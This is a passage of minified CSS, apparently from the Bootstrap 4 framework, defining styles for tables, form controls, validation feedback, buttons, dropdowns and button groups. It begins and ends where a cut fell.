.table-active:hover>th{background-color:rgba(0,0,0,.075)}.table .thead-dark th{color:#fff;background-color:#212529;border-color:#32383e}.table .thead-light th{color:#495057;background-color:#e9ecef;border-color:#dee2e6}.table-dark{color:#fff;background-color:#212529}.table-dark td,.table-dark th,.table-dark thead th{border-color:#32383e}.table-dark.table-bordered{border:0}.table-dark.table-striped tbody tr:nth-of-type(odd){background-color:rgba(255,255,255,.05)}.table-dark.table-hover tbody tr:hover{background-color:rgba(255,255,255,.075)}@media (max-width:575.98px){.table-responsive-sm{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;-ms-overflow-style:-ms-autohiding-scrollbar}.table-responsive-sm>.table-bordered{border:0}}@media (max-width:767.98px){.table-responsive-md{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;-ms-overflow-style:-ms-autohiding-scrollbar}.table-responsive-md>.table-bordered{border:0}}@media (max-width:991.98px){.table-responsive-lg{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;-ms-overflow-style:-ms-autohiding-scrollbar}.table-responsive-lg>.table-bordered{border:0}}@media (max-width:1199.98px){.table-responsive-xl{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;-ms-overflow-style:-ms-autohiding-scrollbar}.table-responsive-xl>.table-bordered{border:0}}.table-responsive{display:block;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;-ms-overflow-style:-ms-autohiding-scrollbar}.table-responsive>.table-bordered{border:0}.form-control{display:block;width:100%;padding:.375rem .75rem;font-size:1rem;line-height:1.5;color:#495057;background-color:#fff;background-clip:padding-box;border:1px solid #ced4da;border-radius:.25rem;transition:border-color .15s ease-in-out,box-shadow .15s ease-in-out}.form-control::-ms-expand{background-color:transparent;border:0}.form-control:focus{color:#495057;background-color:#fff;border-color:#80bdff;outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.form-control::-webkit-input-placeholder{color:#6c757d;opacity:1}.form-control::-moz-placeholder{color:#6c757d;opacity:1}.form-control:-ms-input-placeholder{color:#6c757d;opacity:1}.form-control::-ms-input-placeholder{color:#6c757d;opacity:1}.form-control::placeholder{color:#6c757d;opacity:1}.form-control:disabled,.form-control[readonly]{background-color:#e9ecef;opacity:1}select.form-control:not([size]):not([multiple]){height:calc(2.25rem + 2px)}select.form-control:focus::-ms-value{color:#495057;background-color:#fff}.form-control-file,.form-control-range{display:block;width:100%}.col-form-label{padding-top:calc(.375rem + 1px);padding-bottom:calc(.375rem + 1px);margin-bottom:0;font-size:inherit;line-height:1.5}.col-form-label-lg{padding-top:calc(.5rem + 1px);padding-bottom:calc(.5rem + 1px);font-size:1.25rem;line-height:1.5}.col-form-label-sm{padding-top:calc(.25rem + 1px);padding-bottom:calc(.25rem + 1px);font-size:.875rem;line-height:1.5}.form-control-plaintext{display:block;width:100%;padding-top:.375rem;padding-bottom:.375rem;margin-bottom:0;line-height:1.5;background-color:transparent;border:solid transparent;border-width:1px 0}.form-control-plaintext.form-control-lg,.form-control-plaintext.form-control-sm,.input-group-lg>.form-control-plaintext.form-control,.input-group-lg>.input-group-append>.form-control-plaintext.btn,.input-group-lg>.input-group-append>.form-control-plaintext.input-group-text,.input-group-lg>.input-group-prepend>.form-control-plaintext.btn,.input-group-lg>.input-group-prepend>.form-control-plaintext.input-group-text,.input-group-sm>.form-control-plaintext.form-control,.input-group-sm>.input-group-append>.form-control-plaintext.btn,.input-group-sm>.input-group-append>.form-control-plaintext.input-group-text,.input-group-sm>.input-group-prepend>.form-control-plaintext.btn,.input-group-sm>.input-group-prepend>.form-control-plaintext.input-group-text{padding-right:0;padding-left:0}.form-control-sm,.input-group-sm>.form-control,.input-group-sm>.input-group-append>.btn,.input-group-sm>.input-group-append>.input-group-text,.input-group-sm>.input-group-prepend>.btn,.input-group-sm>.input-group-prepend>.input-group-text{padding:.25rem .5rem;font-size:.875rem;line-height:1.5;border-radius:.2rem}.input-group-sm>.input-group-append>select.btn:not([size]):not([multiple]),.input-group-sm>.input-group-append>select.input-group-text:not([size]):not([multiple]),.input-group-sm>.input-group-prepend>select.btn:not([size]):not([multiple]),.input-group-sm>.input-group-prepend>select.input-group-text:not([size]):not([multiple]),.input-group-sm>select.form-control:not([size]):not([multiple]),select.form-control-sm:not([size]):not([multiple]){height:calc(1.8125rem + 2px)}.form-control-lg,.input-group-lg>.form-control,.input-group-lg>.input-group-append>.btn,.input-group-lg>.input-group-append>.input-group-text,.input-group-lg>.input-group-prepend>.btn,.input-group-lg>.input-group-prepend>.input-group-text{padding:.5rem 1rem;font-size:1.25rem;line-height:1.5;border-radius:.3rem}.input-group-lg>.input-group-append>select.btn:not([size]):not([multiple]),.input-group-lg>.input-group-append>select.input-group-text:not([size]):not([multiple]),.input-group-lg>.input-group-prepend>select.btn:not([size]):not([multiple]),.input-group-lg>.input-group-prepend>select.input-group-text:not([size]):not([multiple]),.input-group-lg>select.form-control:not([size]):not([multiple]),select.form-control-lg:not([size]):not([multiple]){height:calc(2.875rem + 2px)}.form-group{margin-bottom:1rem}.form-text{display:block;margin-top:.25rem}.form-row{display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-5px;margin-left:-5px}.form-row>.col,.form-row>[class*=col-]{padding-right:5px;padding-left:5px}.form-check{position:relative;display:block;padding-left:1.25rem}.form-check-input{position:absolute;margin-top:.3rem;margin-left:-1.25rem}.form-check-input:disabled~.form-check-label{color:#6c757d}.form-check-label{margin-bottom:0}.form-check-inline{display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;padding-left:0;margin-right:.75rem}.form-check-inline .form-check-input{position:static;margin-top:0;margin-right:.3125rem;margin-left:0}.valid-feedback{display:none;width:100%;margin-top:.25rem;font-size:80%;color:#28a745}.valid-tooltip{position:absolute;top:100%;z-index:5;display:none;max-width:100%;padding:.5rem;margin-top:.1rem;font-size:.875rem;line-height:1;color:#fff;background-color:rgba(40,167,69,.8);border-radius:.2rem}.custom-select.is-valid,.form-control.is-valid,.was-validated .custom-select:valid,.was-validated .form-control:valid{border-color:#28a745}.custom-select.is-valid:focus,.form-control.is-valid:focus,.was-validated .custom-select:valid:focus,.was-validated .form-control:valid:focus{border-color:#28a745;box-shadow:0 0 0 .2rem rgba(40,167,69,.25)}.custom-select.is-valid~.valid-feedback,.custom-select.is-valid~.valid-tooltip,.form-control.is-valid~.valid-feedback,.form-control.is-valid~.valid-tooltip,.was-validated .custom-select:valid~.valid-feedback,.was-validated .custom-select:valid~.valid-tooltip,.was-validated .form-control:valid~.valid-feedback,.was-validated .form-control:valid~.valid-tooltip{display:block}.form-check-input.is-valid~.form-check-label,.was-validated .form-check-input:valid~.form-check-label{color:#28a745}.form-check-input.is-valid~.valid-feedback,.form-check-input.is-valid~.valid-tooltip,.was-validated .form-check-input:valid~.valid-feedback,.was-validated .form-check-input:valid~.valid-tooltip{display:block}.custom-control-input.is-valid~.custom-control-label,.was-validated .custom-control-input:valid~.custom-control-label{color:#28a745}.custom-control-input.is-valid~.custom-control-label::before,.was-validated .custom-control-input:valid~.custom-control-label::before{background-color:#71dd8a}.custom-control-input.is-valid~.valid-feedback,.custom-control-input.is-valid~.valid-tooltip,.was-validated .custom-control-input:valid~.valid-feedback,.was-validated .custom-control-input:valid~.valid-tooltip{display:block}.custom-control-input.is-valid:checked~.custom-control-label::before,.was-validated .custom-control-input:valid:checked~.custom-control-label::before{background-color:#34ce57}.custom-control-input.is-valid:focus~.custom-control-label::before,.was-validated .custom-control-input:valid:focus~.custom-control-label::before{box-shadow:0 0 0 1px #fff,0 0 0 .2rem rgba(40,167,69,.25)}.custom-file-input.is-valid~.custom-file-label,.was-validated .custom-file-input:valid~.custom-file-label{border-color:#28a745}.custom-file-input.is-valid~.custom-file-label::before,.was-validated .custom-file-input:valid~.custom-file-label::before{border-color:inherit}.custom-file-input.is-valid~.valid-feedback,.custom-file-input.is-valid~.valid-tooltip,.was-validated .custom-file-input:valid~.valid-feedback,.was-validated .custom-file-input:valid~.valid-tooltip{display:block}.custom-file-input.is-valid:focus~.custom-file-label,.was-validated .custom-file-input:valid:focus~.custom-file-label{box-shadow:0 0 0 .2rem rgba(40,167,69,.25)}.invalid-feedback{display:none;width:100%;margin-top:.25rem;font-size:80%;color:#dc3545}.invalid-tooltip{position:absolute;top:100%;z-index:5;display:none;max-width:100%;padding:.5rem;margin-top:.1rem;font-size:.875rem;line-height:1;color:#fff;background-color:rgba(220,53,69,.8);border-radius:.2rem}.custom-select.is-invalid,.form-control.is-invalid,.was-validated .custom-select:invalid,.was-validated .form-control:invalid{border-color:#dc3545}.custom-select.is-invalid:focus,.form-control.is-invalid:focus,.was-validated .custom-select:invalid:focus,.was-validated .form-control:invalid:focus{border-color:#dc3545;box-shadow:0 0 0 .2rem rgba(220,53,69,.25)}.custom-select.is-invalid~.invalid-feedback,.custom-select.is-invalid~.invalid-tooltip,.form-control.is-invalid~.invalid-feedback,.form-control.is-invalid~.invalid-tooltip,.was-validated .custom-select:invalid~.invalid-feedback,.was-validated .custom-select:invalid~.invalid-tooltip,.was-validated .form-control:invalid~.invalid-feedback,.was-validated .form-control:invalid~.invalid-tooltip{display:block}.form-check-input.is-invalid~.form-check-label,.was-validated .form-check-input:invalid~.form-check-label{color:#dc3545}.form-check-input.is-invalid~.invalid-feedback,.form-check-input.is-invalid~.invalid-tooltip,.was-validated .form-check-input:invalid~.invalid-feedback,.was-validated .form-check-input:invalid~.invalid-tooltip{display:block}.custom-control-input.is-invalid~.custom-control-label,.was-validated .custom-control-input:invalid~.custom-control-label{color:#dc3545}.custom-control-input.is-invalid~.custom-control-label::before,.was-validated .custom-control-input:invalid~.custom-control-label::before{background-color:#efa2a9}.custom-control-input.is-invalid~.invalid-feedback,.custom-control-input.is-invalid~.invalid-tooltip,.was-validated .custom-control-input:invalid~.invalid-feedback,.was-validated .custom-control-input:invalid~.invalid-tooltip{display:block}.custom-control-input.is-invalid:checked~.custom-control-label::before,.was-validated .custom-control-input:invalid:checked~.custom-control-label::before{background-color:#e4606d}.custom-control-input.is-invalid:focus~.custom-control-label::before,.was-validated .custom-control-input:invalid:focus~.custom-control-label::before{box-shadow:0 0 0 1px #fff,0 0 0 .2rem rgba(220,53,69,.25)}.custom-file-input.is-invalid~.custom-file-label,.was-validated .custom-file-input:invalid~.custom-file-label{border-color:#dc3545}.custom-file-input.is-invalid~.custom-file-label::before,.was-validated .custom-file-input:invalid~.custom-file-label::before{border-color:inherit}.custom-file-input.is-invalid~.invalid-feedback,.custom-file-input.is-invalid~.invalid-tooltip,.was-validated .custom-file-input:invalid~.invalid-feedback,.was-validated .custom-file-input:invalid~.invalid-tooltip{display:block}.custom-file-input.is-invalid:focus~.custom-file-label,.was-validated .custom-file-input:invalid:focus~.custom-file-label{box-shadow:0 0 0 .2rem rgba(220,53,69,.25)}.form-inline{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-flow:row wrap;flex-flow:row wrap;-webkit-box-align:center;-ms-flex-align:center;align-items:center}.form-inline .form-check{width:100%}@media (min-width:576px){.form-inline label{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;margin-bottom:0}.form-inline .form-group{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:0 0 auto;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-flow:row wrap;flex-flow:row wrap;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-bottom:0}.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}.form-inline .form-control-plaintext{display:inline-block}.form-inline .input-group{width:auto}.form-inline .form-check{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;width:auto;padding-left:0}.form-inline .form-check-input{position:relative;margin-top:0;margin-right:.25rem;margin-left:0}.form-inline .custom-control{-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.form-inline .custom-control-label{margin-bottom:0}}.btn{display:inline-block;font-weight:400;text-align:center;white-space:nowrap;vertical-align:middle;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border:1px solid transparent;padding:.375rem .75rem;font-size:1rem;line-height:1.5;border-radius:.25rem;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out}.btn:focus,.btn:hover{text-decoration:none}.btn.focus,.btn:focus{outline:0;box-shadow:0 0 0 .2rem rgba(0,123,255,.25)}.btn.disabled,.btn:disabled{opacity:.65}.btn:not(:disabled):not(.disabled){cursor:pointer}.btn:not(:disabled):not(.disabled).active,.btn:not(:disabled):not(.disabled):active{background-image:none}a.btn.disabled,fieldset:disabled a.btn{pointer-events:none}.btn-primary{color:#fff;background-color:#007bff;border-color:#007bff}.btn-primary:hover{color:#fff;background-color:#0069d9;border-color:#0062cc}.btn-primary.focus,.btn-primary:focus{box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-primary.disabled,.btn-primary:disabled{color:#fff;background-color:#007bff;border-color:#007bff}.btn-primary:not(:disabled):not(.disabled).active,.btn-primary:not(:disabled):not(.disabled):active,.show>.btn-primary.dropdown-toggle{color:#fff;background-color:#0062cc;border-color:#005cbf}.btn-primary:not(:disabled):not(.disabled).active:focus,.btn-primary:not(:disabled):not(.disabled):active:focus,.show>.btn-primary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-secondary{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-secondary:hover{color:#fff;background-color:#5a6268;border-color:#545b62}.btn-secondary.focus,.btn-secondary:focus{box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-secondary.disabled,.btn-secondary:disabled{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-secondary:not(:disabled):not(.disabled).active,.btn-secondary:not(:disabled):not(.disabled):active,.show>.btn-secondary.dropdown-toggle{color:#fff;background-color:#545b62;border-color:#4e555b}.btn-secondary:not(:disabled):not(.disabled).active:focus,.btn-secondary:not(:disabled):not(.disabled):active:focus,.show>.btn-secondary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-success{color:#fff;background-color:#28a745;border-color:#28a745}.btn-success:hover{color:#fff;background-color:#218838;border-color:#1e7e34}.btn-success.focus,.btn-success:focus{box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-success.disabled,.btn-success:disabled{color:#fff;background-color:#28a745;border-color:#28a745}.btn-success:not(:disabled):not(.disabled).active,.btn-success:not(:disabled):not(.disabled):active,.show>.btn-success.dropdown-toggle{color:#fff;background-color:#1e7e34;border-color:#1c7430}.btn-success:not(:disabled):not(.disabled).active:focus,.btn-success:not(:disabled):not(.disabled):active:focus,.show>.btn-success.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-info{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-info:hover{color:#fff;background-color:#138496;border-color:#117a8b}.btn-info.focus,.btn-info:focus{box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-info.disabled,.btn-info:disabled{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-info:not(:disabled):not(.disabled).active,.btn-info:not(:disabled):not(.disabled):active,.show>.btn-info.dropdown-toggle{color:#fff;background-color:#117a8b;border-color:#10707f}.btn-info:not(:disabled):not(.disabled).active:focus,.btn-info:not(:disabled):not(.disabled):active:focus,.show>.btn-info.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-warning{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-warning:hover{color:#212529;background-color:#e0a800;border-color:#d39e00}.btn-warning.focus,.btn-warning:focus{box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-warning.disabled,.btn-warning:disabled{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-warning:not(:disabled):not(.disabled).active,.btn-warning:not(:disabled):not(.disabled):active,.show>.btn-warning.dropdown-toggle{color:#212529;background-color:#d39e00;border-color:#c69500}.btn-warning:not(:disabled):not(.disabled).active:focus,.btn-warning:not(:disabled):not(.disabled):active:focus,.show>.btn-warning.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-danger{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-danger:hover{color:#fff;background-color:#c82333;border-color:#bd2130}.btn-danger.focus,.btn-danger:focus{box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-danger.disabled,.btn-danger:disabled{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-danger:not(:disabled):not(.disabled).active,.btn-danger:not(:disabled):not(.disabled):active,.show>.btn-danger.dropdown-toggle{color:#fff;background-color:#bd2130;border-color:#b21f2d}.btn-danger:not(:disabled):not(.disabled).active:focus,.btn-danger:not(:disabled):not(.disabled):active:focus,.show>.btn-danger.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-light{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-light:hover{color:#212529;background-color:#e2e6ea;border-color:#dae0e5}.btn-light.focus,.btn-light:focus{box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-light.disabled,.btn-light:disabled{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-light:not(:disabled):not(.disabled).active,.btn-light:not(:disabled):not(.disabled):active,.show>.btn-light.dropdown-toggle{color:#212529;background-color:#dae0e5;border-color:#d3d9df}.btn-light:not(:disabled):not(.disabled).active:focus,.btn-light:not(:disabled):not(.disabled):active:focus,.show>.btn-light.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-dark{color:#fff;background-color:#343a40;border-color:#343a40}.btn-dark:hover{color:#fff;background-color:#23272b;border-color:#1d2124}.btn-dark.focus,.btn-dark:focus{box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.btn-dark.disabled,.btn-dark:disabled{color:#fff;background-color:#343a40;border-color:#343a40}.btn-dark:not(:disabled):not(.disabled).active,.btn-dark:not(:disabled):not(.disabled):active,.show>.btn-dark.dropdown-toggle{color:#fff;background-color:#1d2124;border-color:#171a1d}.btn-dark:not(:disabled):not(.disabled).active:focus,.btn-dark:not(:disabled):not(.disabled):active:focus,.show>.btn-dark.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.btn-outline-primary{color:#007bff;background-color:transparent;background-image:none;border-color:#007bff}.btn-outline-primary:hover{color:#fff;background-color:#007bff;border-color:#007bff}.btn-outline-primary.focus,.btn-outline-primary:focus{box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-outline-primary.disabled,.btn-outline-primary:disabled{color:#007bff;background-color:transparent}.btn-outline-primary:not(:disabled):not(.disabled).active,.btn-outline-primary:not(:disabled):not(.disabled):active,.show>.btn-outline-primary.dropdown-toggle{color:#fff;background-color:#007bff;border-color:#007bff}.btn-outline-primary:not(:disabled):not(.disabled).active:focus,.btn-outline-primary:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-primary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-outline-secondary{color:#6c757d;background-color:transparent;background-image:none;border-color:#6c757d}.btn-outline-secondary:hover{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-outline-secondary.focus,.btn-outline-secondary:focus{box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-outline-secondary.disabled,.btn-outline-secondary:disabled{color:#6c757d;background-color:transparent}.btn-outline-secondary:not(:disabled):not(.disabled).active,.btn-outline-secondary:not(:disabled):not(.disabled):active,.show>.btn-outline-secondary.dropdown-toggle{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-outline-secondary:not(:disabled):not(.disabled).active:focus,.btn-outline-secondary:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-secondary.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-outline-success{color:#28a745;background-color:transparent;background-image:none;border-color:#28a745}.btn-outline-success:hover{color:#fff;background-color:#28a745;border-color:#28a745}.btn-outline-success.focus,.btn-outline-success:focus{box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-outline-success.disabled,.btn-outline-success:disabled{color:#28a745;background-color:transparent}.btn-outline-success:not(:disabled):not(.disabled).active,.btn-outline-success:not(:disabled):not(.disabled):active,.show>.btn-outline-success.dropdown-toggle{color:#fff;background-color:#28a745;border-color:#28a745}.btn-outline-success:not(:disabled):not(.disabled).active:focus,.btn-outline-success:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-success.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-outline-info{color:#17a2b8;background-color:transparent;background-image:none;border-color:#17a2b8}.btn-outline-info:hover{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-outline-info.focus,.btn-outline-info:focus{box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-outline-info.disabled,.btn-outline-info:disabled{color:#17a2b8;background-color:transparent}.btn-outline-info:not(:disabled):not(.disabled).active,.btn-outline-info:not(:disabled):not(.disabled):active,.show>.btn-outline-info.dropdown-toggle{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-outline-info:not(:disabled):not(.disabled).active:focus,.btn-outline-info:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-info.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-outline-warning{color:#ffc107;background-color:transparent;background-image:none;border-color:#ffc107}.btn-outline-warning:hover{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-outline-warning.focus,.btn-outline-warning:focus{box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-outline-warning.disabled,.btn-outline-warning:disabled{color:#ffc107;background-color:transparent}.btn-outline-warning:not(:disabled):not(.disabled).active,.btn-outline-warning:not(:disabled):not(.disabled):active,.show>.btn-outline-warning.dropdown-toggle{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-outline-warning:not(:disabled):not(.disabled).active:focus,.btn-outline-warning:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-warning.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-outline-danger{color:#dc3545;background-color:transparent;background-image:none;border-color:#dc3545}.btn-outline-danger:hover{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-outline-danger.focus,.btn-outline-danger:focus{box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-outline-danger.disabled,.btn-outline-danger:disabled{color:#dc3545;background-color:transparent}.btn-outline-danger:not(:disabled):not(.disabled).active,.btn-outline-danger:not(:disabled):not(.disabled):active,.show>.btn-outline-danger.dropdown-toggle{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-outline-danger:not(:disabled):not(.disabled).active:focus,.btn-outline-danger:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-danger.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-outline-light{color:#f8f9fa;background-color:transparent;background-image:none;border-color:#f8f9fa}.btn-outline-light:hover{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-outline-light.focus,.btn-outline-light:focus{box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-outline-light.disabled,.btn-outline-light:disabled{color:#f8f9fa;background-color:transparent}.btn-outline-light:not(:disabled):not(.disabled).active,.btn-outline-light:not(:disabled):not(.disabled):active,.show>.btn-outline-light.dropdown-toggle{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-outline-light:not(:disabled):not(.disabled).active:focus,.btn-outline-light:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-light.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-outline-dark{color:#343a40;background-color:transparent;background-image:none;border-color:#343a40}.btn-outline-dark:hover{color:#fff;background-color:#343a40;border-color:#343a40}.btn-outline-dark.focus,.btn-outline-dark:focus{box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.btn-outline-dark.disabled,.btn-outline-dark:disabled{color:#343a40;background-color:transparent}.btn-outline-dark:not(:disabled):not(.disabled).active,.btn-outline-dark:not(:disabled):not(.disabled):active,.show>.btn-outline-dark.dropdown-toggle{color:#fff;background-color:#343a40;border-color:#343a40}.btn-outline-dark:not(:disabled):not(.disabled).active:focus,.btn-outline-dark:not(:disabled):not(.disabled):active:focus,.show>.btn-outline-dark.dropdown-toggle:focus{box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.btn-link{font-weight:400;color:#007bff;background-color:transparent}.btn-link:hover{color:#0056b3;text-decoration:underline;background-color:transparent;border-color:transparent}.btn-link.focus,.btn-link:focus{text-decoration:underline;border-color:transparent;box-shadow:none}.btn-link.disabled,.btn-link:disabled{color:#6c757d}.btn-group-lg>.btn,.btn-lg{padding:.5rem 1rem;font-size:1.25rem;line-height:1.5;border-radius:.3rem}.btn-group-sm>.btn,.btn-sm{padding:.25rem .5rem;font-size:.875rem;line-height:1.5;border-radius:.2rem}.btn-block{display:block;width:100%}.btn-block+.btn-block{margin-top:.5rem}input[type=button].btn-block,input[type=reset].btn-block,input[type=submit].btn-block{width:100%}.fade{opacity:0;transition:opacity .15s linear}.fade.show{opacity:1}.collapse{display:none}.collapse.show{display:block}tr.collapse.show{display:table-row}tbody.collapse.show{display:table-row-group}.collapsing{position:relative;height:0;overflow:hidden;transition:height .35s ease}.dropdown,.dropup{position:relative}.dropdown-toggle::after{display:inline-block;width:0;height:0;margin-left:.255em;vertical-align:.255em;content:"";border-top:.3em solid;border-right:.3em solid transparent;border-bottom:0;border-left:.3em solid transparent}.dropdown-toggle:empty::after{margin-left:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:10rem;padding:.5rem 0;margin:.125rem 0 0;font-size:1rem;color:#212529;text-align:left;list-style:none;background-color:#fff;background-clip:padding-box;border:1px solid rgba(0,0,0,.15);border-radius:.25rem}.dropup .dropdown-menu{margin-top:0;margin-bottom:.125rem}.dropup .dropdown-toggle::after{display:inline-block;width:0;height:0;margin-left:.255em;vertical-align:.255em;content:"";border-top:0;border-right:.3em solid transparent;border-bottom:.3em solid;border-left:.3em solid transparent}.dropup .dropdown-toggle:empty::after{margin-left:0}.dropright .dropdown-menu{margin-top:0;margin-left:.125rem}.dropright .dropdown-toggle::after{display:inline-block;width:0;height:0;margin-left:.255em;vertical-align:.255em;content:"";border-top:.3em solid transparent;border-bottom:.3em solid transparent;border-left:.3em solid}.dropright .dropdown-toggle:empty::after{margin-left:0}.dropright .dropdown-toggle::after{vertical-align:0}.dropleft .dropdown-menu{margin-top:0;margin-right:.125rem}.dropleft .dropdown-toggle::after{display:inline-block;width:0;height:0;margin-left:.255em;vertical-align:.255em;content:""}.dropleft .dropdown-toggle::after{display:none}.dropleft .dropdown-toggle::before{display:inline-block;width:0;height:0;margin-right:.255em;vertical-align:.255em;content:"";border-top:.3em solid transparent;border-right:.3em solid;border-bottom:.3em solid transparent}.dropleft .dropdown-toggle:empty::after{margin-left:0}.dropleft .dropdown-toggle::before{vertical-align:0}.dropdown-divider{height:0;margin:.5rem 0;overflow:hidden;border-top:1px solid #e9ecef}.dropdown-item{display:block;width:100%;padding:.25rem 1.5rem;clear:both;font-weight:400;color:#212529;text-align:inherit;white-space:nowrap;background-color:transparent;border:0}.dropdown-item:focus,.dropdown-item:hover{color:#16181b;text-decoration:none;background-color:#f8f9fa}.dropdown-item.active,.dropdown-item:active{color:#fff;text-decoration:none;background-color:#007bff}.dropdown-item.disabled,.dropdown-item:disabled{color:#6c757d;background-color:transparent}.dropdown-menu.show{display:block}.dropdown-header{display:block;padding:.5rem 1.5rem;margin-bottom:0;font-size:.875rem;color:#6c757d;white-space:nowrap}.btn-group,.btn-group-vertical{position:relative;display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;vertical-align:middle}.btn-group-vertical>.btn,.btn-group>.btn{position:relative;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:0 1 auto}.btn-group-vertical>.btn:hover,.btn-group>.btn:hover{z-index:1}.btn-group-vertical>.btn.active,.btn-group-vertical>.btn:active,.btn-group-vertical>.btn:focus,.btn-group>.btn.active,.btn-group>.btn:active,.btn-group>.btn:focus{z-index:1}.btn-group .btn+.btn,.btn-group .btn+.btn-group,.btn-group .btn-group+.btn,.btn-group .btn-group+.btn-group,.btn-group-vertical .btn+.btn,.btn-group-vertical .btn+.btn-group,.btn-group-vertical .btn-group+.btn,.btn-group-vertical .btn-group+.btn-group{margin-left:-1px}.btn-toolbar{display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.btn-toolbar 